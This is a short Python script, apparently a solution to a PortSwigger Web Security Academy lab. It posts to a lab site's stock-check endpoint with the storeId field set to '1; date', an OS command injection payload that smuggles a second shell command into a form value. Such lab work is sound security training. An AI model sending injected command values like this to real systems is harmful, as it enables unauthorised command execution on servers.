import requests

s = requests.Session()
stock_post_url = 'https://ac221f531f4bf97d809267d400260001.web-security-academy.net/product/stock'
post_data = {
    'productId' : "1",
    'storeId' : "1; date"
}
resp = s.post(stock_post_url, data=post_data)
print(resp.text)